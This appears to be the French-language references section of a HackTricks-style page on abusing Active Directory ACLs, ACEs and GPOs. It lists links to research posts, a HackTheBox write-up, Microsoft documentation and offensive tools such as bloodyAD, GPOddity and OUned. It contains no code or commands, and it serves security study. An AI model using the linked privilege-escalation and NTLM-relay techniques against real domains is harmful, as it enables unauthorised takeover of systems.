- [1] [Abus des ACL/ACE Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Comptes privilégiés et privilèges de token](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Mise à jour des chemins d’attaque ACL](https://wald0.com/?p=112)
- [4] [Énumération ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Élévation de privilèges avec les ACL dans Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Recherche des privilèges et des comptes privilégiés Active Directory](https://adsecurity.org/?p=3658)
- [7] [Constructeur ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Opérations sur les attributs/UAC AD depuis Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (appartenance aux groupes)](https://www.samba.org/)
- [10] [HTB Puppy : abus des ACL AD, cassage Argon2 de KeePassXC et déchiffrement DPAPI pour obtenir les droits admin sur le DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out : détournement des chemins UNC des GPO pour l’exécution de code et le relais NTLM](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity : exploitation des GPO Active Directory via le relais NTLM, et plus encore](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [L’OU fait rire ? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py : exploitation des vecteurs d’attaque ACL des unités organisationnelles masquées dans Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Simulation de services Active Directory légitimes sur le réseau : le cas de l’exploitation des GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
